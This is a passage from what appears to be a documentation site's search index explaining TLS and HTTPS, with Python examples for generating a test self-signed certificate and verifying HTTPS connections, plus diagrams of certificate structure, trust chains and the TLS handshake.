\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# Example 3: Generate Self-Signed Certificate (Testing)\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\ndef generate_self_signed_cert(common_name=\"localhost\"):\n    \"\"\"\n    Generate self-signed certificate for testing\n    \u26a0\ufe0f  DO NOT use in production!\n    \"\"\"\n    print(f\"\\n{'='*70}\")\n    print(f\"Generating Self-Signed Certificate\")\n    print(f\"{'='*70}\\n\")\n\n    # Generate private key\n    private_key = rsa.generate_private_key(\n        public_exponent=65537,\n        key_size=2048,\n        backend=default_backend()\n    )\n\n    # Create certificate\n    subject = issuer = x509.Name([\n        x509.NameAttribute(NameOID.COUNTRY_NAME, \"US\"),\n        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, \"California\"),\n        x509.NameAttribute(NameOID.LOCALITY_NAME, \"San Francisco\"),\n        x509.NameAttribute(NameOID.ORGANIZATION_NAME, \"Test Org\"),\n        x509.NameAttribute(NameOID.COMMON_NAME, common_name),\n    ])\n\n    cert = x509.CertificateBuilder().subject_name(\n        subject\n    ).issuer_name(\n        issuer\n    ).public_key(\n        private_key.public_key()\n    ).serial_number(\n        x509.random_serial_number()\n    ).not_valid_before(\n        datetime.utcnow()\n    ).not_valid_after(\n        datetime.utcnow() + timedelta(days=365)\n    ).add_extension(\n        x509.SubjectAlternativeName([\n            x509.DNSName(common_name),\n        ]),\n        critical=False,\n    ).sign(private_key, hashes.SHA256(), default_backend())\n\n    # Save private key\n    with open(\"test-private-key.pem\", \"wb\") as f:\n        f.write(private_key.private_bytes(\n            encoding=serialization.Encoding.PEM,\n            format=serialization.PrivateFormat.TraditionalOpenSSL,\n            encryption_algorithm=serialization.NoEncryption()\n        ))\n\n    # Save certificate\n    with open(\"test-certificate.pem\", \"wb\") as f:\n        f.write(cert.public_bytes(serialization.Encoding.PEM))\n\n    print(\"\u2705 Generated:\")\n    print(\"   \u2022 test-private-key.pem (Private Key)\")\n    print(\"   \u2022 test-certificate.pem (Certificate)\")\n    print(\"\\n\u26a0\ufe0f  Self-signed certificate is for TESTING only!\")\n    print(\"   Browsers will show security warnings.\")\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# Example 4: Verify HTTPS Connection\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\ndef verify_https_connection(url):\n    \"\"\"\n    Make HTTPS request and verify certificate\n    \"\"\"\n    print(f\"\\n{'='*70}\")\n    print(f\"Verifying HTTPS Connection\")\n    print(f\"{'='*70}\\n\")\n\n    try:\n        # Make request (verifies certificate automatically)\n        response = requests.get(url, timeout=5)\n\n        print(f\"\u2705 HTTPS Connection Successful\")\n        print(f\"   URL: {url}\")\n        print(f\"   Status: {response.status_code}\")\n        print(f\"   Certificate: Valid and Trusted\")\n\n    except requests.exceptions.SSLError as e:\n        print(f\"\u274c SSL Certificate Error!\")\n        print(f\"   {str(e)}\")\n        print(f\"\\n   Possible causes:\")\n        print(f\"   \u2022 Expired certificate\")\n        print(f\"   \u2022 Self-signed certificate\")\n        print(f\"   \u2022 Hostname mismatch\")\n        print(f\"   \u2022 Untrusted CA\")\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# Example 5: Compare HTTP vs HTTPS Security\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\ndef demonstrate_http_vs_https():\n    \"\"\"\n    Demonstrate difference between HTTP and HTTPS\n    \"\"\"\n    print(f\"\\n{'='*70}\")\n    print(f\"HTTP vs HTTPS Security Demonstration\")\n    print(f\"{'='*70}\\n\")\n\n    print(\"HTTP (Insecure):\")\n    print(\"\u2500\"*70)\n    print(\"\u274c No Encryption\")\n    print(\"   \u2022 Data sent in plaintext\")\n    print(\"   \u2022 Passwords visible to attackers\")\n    print(\"   \u2022 Subject to man-in-the-middle attacks\")\n    print(\"\\n\u274c No Authentication\")\n    print(\"   \u2022 Cannot verify server identity\")\n    print(\"   \u2022 Easy to impersonate\")\n    print(\"\\n\u274c No Integrity\")\n    print(\"   \u2022 Data can be modified in transit\")\n    print(\"   \u2022 No tamper detection\")\n\n    print(f\"\\n{'\u2500'*70}\\n\")\n\n    print(\"HTTPS (Secure):\")\n    print(\"\u2500\"*70)\n    print(\"\u2705 Encryption (TLS)\")\n    print(\"   \u2022 All data encrypted with AES-256\")\n    print(\"   \u2022 Passwords protected\")\n    print(\"   \u2022 Prevents eavesdropping\")\n    print(\"\\n\u2705 Authentication (Certificates)\")\n    print(\"   \u2022 Server identity verified\")\n    print(\"   \u2022 Signed by trusted CA\")\n    print(\"   \u2022 Domain name validated\")\n    print(\"\\n\u2705 Integrity (HMAC)\")\n    print(\"   \u2022 Detects any modification\")\n    print(\"   \u2022 Message authentication code\")\n    print(\"   \u2022 Ensures data arrives unchanged\")\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# Main Demonstration\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nif __name__ == '__main__':\n    # Example 1: Get certificate info\n    get_server_certificate(\"www.google.com\")\n\n    # Example 2: Verify chain\n    verify_certificate_chain(\"www.google.com\")\n\n    # Example 3: Generate self-signed cert for testing\n    # generate_self_signed_cert(\"localhost\")\n\n    # Example 4: Verify HTTPS\n    verify_https_connection(\"https://www.google.com\")\n\n    # Example 5: HTTP vs HTTPS\n    demonstrate_http_vs_https()\n\n    print(f\"\\n{'='*70}\")\n    print(\"KEY TAKEAWAYS\")\n    print(f\"{'='*70}\")\n    print(\"\"\"\n    CERTIFICATES PROVIDE:\n    \u2022 Identity verification (who you're connecting to)\n    \u2022 Public key distribution (how to encrypt)\n    \u2022 Trust chain (why you should trust them)\n\n    HTTPS USES:\n    \u2022 Asymmetric encryption (handshake, key exchange)\n    \u2022 Symmetric encryption (data transfer)\n    \u2022 Digital certificates (authentication)\n    \u2022 Best of all worlds!\n\n    CERTIFICATE TYPES:\n    \u2022 Root CA: Trust anchor, pre-installed\n    \u2022 Intermediate CA: Issues certificates\n    \u2022 Server: Proves website identity\n    \u2022 Client: Proves user identity (mTLS)\n    \"\"\")\n</code></pre> <p>Key Concepts Summary:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                  CERTIFICATES SUMMARY                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nROOT CA CERTIFICATE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPurpose: Trust anchor\nLocation: Pre-installed in OS/browser\nValidity: 20-30 years\nUsage: Signs intermediate CAs only\nExample: DigiCert Global Root CA\n\nINTERMEDIATE CA CERTIFICATE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPurpose: Issue end-entity certificates\nLocation: Sent by server during TLS\nValidity: 5-10 years\nUsage: Signs server/client certificates\nExample: DigiCert TLS RSA SHA256 CA\n\nSERVER CERTIFICATE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPurpose: Prove server identity\nLocation: Installed on web server\nValidity: 90 days - 1 year\nUsage: TLS/HTTPS connections\nExample: www.example.com certificate\n\nCLIENT CERTIFICATE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPurpose: Prove client identity\nLocation: On user's device\nValidity: 1-3 years\nUsage: Mutual TLS (mTLS), VPN\nExample: Employee certificate\n\nHOW THEY WORK TOGETHER:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Server sends: Server Cert + Intermediate Cert\n2. Browser verifies: Chain up to Root CA\n3. Browser trusts: Root CA in trust store\n4. Result: \u2705 Trusted connection\n5. Encryption: Asymmetric \u2192 Symmetric\n6. Data transfer: Fast and secure!\n</code></pre>"},{"location":"security/encryption/#modern-tls-13-improvements","title":"Modern TLS 1.3 Improvements","text":"<p>TLS 1.3 Handshake (Faster):</p> <pre><code>TLS 1.2 (Old):                    TLS 1.3 (New):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n2 Round Trips:                    1 Round Trip:\n\nClient \u2500\u2500\u25b6 Hello                  Client \u2500\u2500\u25b6 Hello + Key Share\n       \u25c0\u2500\u2500 Hello, Cert, Key               \u25c0\u2500\u2500 Hello, Cert, Finished\nClient \u2500\u2500\u25b6 Key, Finished          \n       \u25c0\u2500\u2500 Finished               \u2588\u2588\u2588\u2588 Data (Encrypted)\n\n\u2588\u2588\u2588\u2588 Data (Encrypted)             \u26a1 50% faster connection!\n\nImprovements:\n\u2705 Faster handshake (1-RTT vs 2-RTT)\n\u2705 Stronger ciphers only\n\u2705 Perfect Forward Secrecy mandatory\n\u2705 Removed insecure features\n</code></pre>"},{"location":"security/encryption/#digital-certificates-in-https","title":"Digital Certificates in HTTPS","text":"<p>What is a Digital Certificate?</p> <p>A digital certificate is a digital identity card that proves the server's identity. It contains the server's public key and is signed by a trusted Certificate Authority (CA).</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Digital Certificate Structure                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           X.509 Certificate                            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                        \u2502\n\u2502  1. VERSION                                            \u2502\n\u2502     Version: 3                                         \u2502\n\u2502                                                        \u2502\n\u2502  2. SERIAL NUMBER                                      \u2502\n\u2502     Serial: 04:3B:7F:23:A8:...                        \u2502\n\u2502                                                        \u2502\n\u2502  3. SIGNATURE ALGORITHM                                \u2502\n\u2502     Algorithm: sha256WithRSAEncryption                 \u2502\n\u2502                                                        \u2502\n\u2502  4. ISSUER (Certificate Authority)                     \u2502\n\u2502     CN = DigiCert Global Root CA                       \u2502\n\u2502     O  = DigiCert Inc                                  \u2502\n\u2502     C  = US                                            \u2502\n\u2502                                                        \u2502\n\u2502  5. VALIDITY PERIOD                                    \u2502\n\u2502     Not Before: Jan 1 00:00:00 2024 GMT               \u2502\n\u2502     Not After:  Jan 1 23:59:59 2025 GMT               \u2502\n\u2502                                                        \u2502\n\u2502  6. SUBJECT (Server Identity)                          \u2502\n\u2502     CN = www.example.com                               \u2502\n\u2502     O  = Example Corp                                  \u2502\n\u2502     L  = San Francisco                                 \u2502\n\u2502     ST = California                                    \u2502\n\u2502     C  = US                                            \u2502\n\u2502                                                        \u2502\n\u2502  7. PUBLIC KEY INFO                                    \u2502\n\u2502     Algorithm: RSA                                     \u2502\n\u2502     Key Size: 2048 bits                                \u2502\n\u2502     Public Key: 30:82:01:0A:02:82:01:01:00:...        \u2502\n\u2502                                                        \u2502\n\u2502  8. EXTENSIONS                                         \u2502\n\u2502     a) Subject Alternative Names (SAN)                 \u2502\n\u2502        DNS: www.example.com                            \u2502\n\u2502        DNS: example.com                                \u2502\n\u2502        DNS: *.example.com                              \u2502\n\u2502                                                        \u2502\n\u2502     b) Key Usage                                       \u2502\n\u2502        Digital Signature, Key Encipherment             \u2502\n\u2502                                                        \u2502\n\u2502     c) Extended Key Usage                              \u2502\n\u2502        TLS Web Server Authentication                   \u2502\n\u2502                                                        \u2502\n\u2502     d) Authority Key Identifier                        \u2502\n\u2502        KeyID: 03:DE:50:35:56:D1:...                   \u2502\n\u2502                                                        \u2502\n\u2502  9. CA SIGNATURE                                       \u2502\n\u2502     Signature: 8F:2A:B3:C4:...                        \u2502\n\u2502     (Signed with CA's Private Key)                     \u2502\n\u2502                                                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/encryption/#certificate-components-explained","title":"Certificate Components Explained","text":"Component Description Example Version X.509 certificate version v3 (most common) Serial Number Unique identifier for certificate 04:3B:7F:23:A8... Signature Algorithm Algorithm used by CA to sign SHA-256 with RSA Issuer Certificate Authority that issued cert DigiCert, Let's Encrypt Validity Period Start and end dates Jan 1, 2024 - Jan 1, 2025 Subject Entity the certificate identifies www.example.com Public Key Server's public key 2048-bit RSA key Extensions Additional information SANs, Key Usage, etc. CA Signature Digital signature by CA Proves authenticity"},{"location":"security/encryption/#certificate-trust-chain","title":"Certificate Trust Chain","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           Certificate Trust Chain (PKI)                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                  \u2502   ROOT CA            \u2502\n                  \u2502  (Self-Signed)       \u2502\n                  \u2502                      \u2502\n                  \u2502 \"DigiCert Root CA\"   \u2502\n                  \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n                  \u2502  \u2502 Public Key   \u2502    \u2502\n                  \u2502  \u2502 Private Key  \u2502    \u2502\n                  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                             \u2502 Signs\n                             \u2502 (with private key)\n                             \u25bc\n                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                  \u2502 INTERMEDIATE CA      \u2502\n                  \u2502                      \u2502\n                  \u2502 \"DigiCert SHA2       \u2502\n                  \u2502  Secure Server CA\"   \u2502\n                  \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n                  \u2502  \u2502 Public Key   \u2502    \u2502\n                  \u2502  \u2502 Private Key  \u2502    \u2502\n                  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                             \u2502 Signs\n                             \u2502 (with private key)\n                             \u25bc\n                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                  \u2502  SERVER CERTIFICATE  \u2502\n                  \u2502                      \u2502\n                  \u2502 \"www.example.com\"    \u2502\n                  \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n                  \u2502  \u2502 Public Key   \u2502    \u2502\n                  \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nVERIFICATION PROCESS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nBrowser receives:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1. Server Certificate (example.com) \u2502\n\u2502 2. Intermediate Certificate         \u2502\n\u2502 3. (Root CA already trusted)        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nVerification Steps:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                          \u2502\n\u2502 Step 1: Verify Server Certificate                       \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                         \u2502\n\u2502 \u2022 Get CA signature from server cert                      \u2502\n\u2502 \u2022 Get public key from intermediate cert                  \u2502\n\u2502 \u2022 Verify signature with public key                       \u2502\n\u2502 \u2022 Check: Domain name, expiry, revocation                 \u2502\n\u2502   \u2713 Valid!                                               \u2502\n\u2502                                                          \u2502\n\u2502 Step 2: Verify Intermediate Certificate                 \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                       \u2502\n\u2502 \u2022 Get CA signature from intermediate cert                \u2502\n\u2502 \u2022 Get public key from root cert (in browser)             \u2502\n\u2502 \u2022 Verify signature with public key                       \u2502\n\u2502   \u2713 Valid!                                               \u2502\n\u2502                                                          \u2502\n\u2502 Step 3: Check Root Certificate                          \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                            \u2502\n\u2502 \u2022 Is root CA in browser's trust store?                   \u2502\n\u2502   \u2713 Yes! (Pre-installed by browser/OS)                   \u2502\n\u2502                                                          \u2502\n\u2502 RESULT: Trust established! \ud83d\udd12                            \u2502\n\u2502                                                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/encryption/#how-certificates-are-used-in-https","title":"How Certificates Are Used in HTTPS","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        Complete HTTPS Flow with Certificates                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSTEP 1: User Visits Website\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Browser \u2502 User types: https://example.com\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u2502 (1) TCP Connection\n     \u2502\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Server  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSTEP 2: TLS Handshake Begins\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nBrowser \u2500\u2500\u25b6 ClientHello\n            \"I support TLS 1.3, AES-256, etc.\"\n\nServer  \u2500\u2500\u25b6 ServerHello\n            \"Let's use TLS 1.3 with AES-256-GCM\"\n\nSTEP 3: Server Sends Certificate\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nServer  \u2500\u2500\u25b6 Certificate Chain:\n            